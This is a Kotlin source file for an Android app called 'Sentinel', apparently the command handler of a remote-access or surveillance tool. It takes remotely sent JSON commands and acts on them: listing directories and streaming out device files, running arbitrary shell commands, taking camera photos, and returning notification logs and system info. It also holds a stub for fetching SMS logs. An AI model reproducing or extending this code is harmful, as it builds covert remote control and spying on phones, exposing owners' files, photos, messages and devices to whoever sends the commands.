package com.sentinel.host.service

import android.util.Log
import com.sentinel.host.data.device.BeaconManager
import com.sentinel.host.data.device.CameraCapturer
import com.sentinel.host.data.device.ShellExecutor
import com.sentinel.host.data.device.SystemInfoProvider
import com.sentinel.shared.protocol.CommandTypes
import com.sentinel.shared.protocol.MessageType
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

import com.sentinel.host.data.device.RemoteFileManager
import com.sentinel.host.data.device.SentinelLogBuffer

@Singleton
class CommandProcessor @Inject constructor(
    private val systemInfoProvider: SystemInfoProvider,
    private val beaconManager: BeaconManager,
    private val shellExecutor: ShellExecutor,
    private val cameraCapturer: CameraCapturer,
    private val remoteFileManager: RemoteFileManager,
    private val fileStreamer: FileStreamer,
    private val sentinelLogBuffer: SentinelLogBuffer
) {
    companion object {
        private const val TAG = "Sentinel:CmdProc"
    }

    private val scope = CoroutineScope(Dispatchers.Default)

    fun processCommand(
        rawMessage: String,
        sendResult: (String) -> Unit
    ) {
        scope.launch {
            try {
                val json = JSONObject(rawMessage)
                val msgType = json.optString("type")
                val sequence = json.optLong("sequence", 0L)

                if (msgType == "FILES_LIST_REQ") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val path = data.optString("path", "/storage/emulated/0")
                    Log.i(TAG, "Processing FILES_LIST_REQ for path: $path")
                    val filesResponse = remoteFileManager.listDirectory(path, sequence)
                    sendResult(filesResponse)
                    return@launch
                }

                if (msgType == "FILE_DOWNLOAD_REQ") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val path = data.optString("path", "")
                    val offset = data.optLong("offset", 0L)
                    val nonce = data.optString("nonce", "")
                    Log.i(TAG, "Processing FILE_DOWNLOAD_REQ for path: $path")
                    fileStreamer.handleFileDownloadReq(path, offset, nonce, sequence)
                    return@launch
                }

                if (msgType == "FILE_CHUNK_ACK") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val ackSequence = data.optLong("sequence", 0L)
                    Log.i(TAG, "Processing FILE_CHUNK_ACK for sequence: $ackSequence")
                    fileStreamer.handleChunkAck(ackSequence)
                    return@launch
                }

                if (msgType == "FILE_STOP_REQ") {
                    val data = json.optJSONObject("data") ?: JSONObject()
                    val path = data.optString("path", "")
                    Log.i(TAG, "Processing FILE_STOP_REQ for path: $path")
                    fileStreamer.handleFileStopReq(path)
                    return@launch
                }

                if (msgType != MessageType.COMMAND) return@launch

                val data = json.getJSONObject("data")
                val command = data.getString("command")
                val params = data.optJSONObject("params") ?: JSONObject()

                Log.i(TAG, "Processing incoming command: $command")

                val resultPayload = mutableMapOf<String, Any?>()
                var isSuccess = true
                var errorMessage = ""

                when (command) {
                    CommandTypes.GET_SYSTEM_INFO -> {
                        val info = systemInfoProvider.getSystemInfo()
                        resultPayload.putAll(info)
                    }

                    CommandTypes.TRIGGER_BEACON -> {
                        beaconManager.triggerBeacon()
                        resultPayload["beaconTriggered"] = true
                    }

                    CommandTypes.EXECUTE_SHELL -> {
                        val shellCmd = params.optString("cmd", "uptime")
                        val output = shellExecutor.execute(shellCmd)
                        resultPayload.putAll(output)
                    }

                    CommandTypes.CAPTURE_PHOTO -> {
                        val facingFront = params.optBoolean("front", false)
                        val captureResult = cameraCapturer.capturePhoto(facingFront)
                        if (captureResult["success"] == true) {
                            resultPayload.putAll(captureResult)
                        } else {
                            isSuccess = false
                            errorMessage = captureResult["error"]?.toString() ?: "Photo capture failed"
                        }
                    }

                    CommandTypes.FETCH_SMS_LOGS -> {
                        resultPayload["logs"] = listOf<Map<String, String>>()
                    }

                    CommandTypes.FETCH_NOTIFICATION_LOGS -> {
                        val logs = SentinelLogBuffer.instance.getLogsAsJsonArray()
                        resultPayload["notificationLogs"] = logs.toString()
                    }

                    else -> {
                        isSuccess = false
                        errorMessage = "Unknown command: $command"
                    }
                }

                // Construct COMMAND_RESULT response safely
                val responseJson = JSONObject().apply {
                    put("type", MessageType.COMMAND_RESULT)
                    put("version", 1)
                    put("timestamp", System.currentTimeMillis() / 1000)
                    put("sequence", sequence)

                    val resData = JSONObject().apply {
                        put("command", command)
                        put("success", isSuccess)
                        if (!isSuccess) put("error", errorMessage)
                        put("payload", mapToJsonObject(resultPayload))
                    }
                    put("data", resData)
                }

                Log.i(TAG, "Sending COMMAND_RESULT for $command (success=$isSuccess, error=$errorMessage)")
                sendResult(responseJson.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Failed to process command: ${e.message}", e)
            }
        }
    }

    private fun mapToJsonObject(map: Map<String, Any?>): JSONObject {
        val json = JSONObject()
        for ((key, value) in map) {
            when (value) {
                null -> json.put(key, JSONObject.NULL)
                is Map<*, *> -> json.put(key, mapToJsonObject(value as Map<String, Any?>))
                is List<*> -> {
                    val array = JSONArray()
                    value.forEach { array.put(it) }
                    json.put(key, array)
                }
                else -> json.put(key, value)
            }
        }
        return json
    }
}
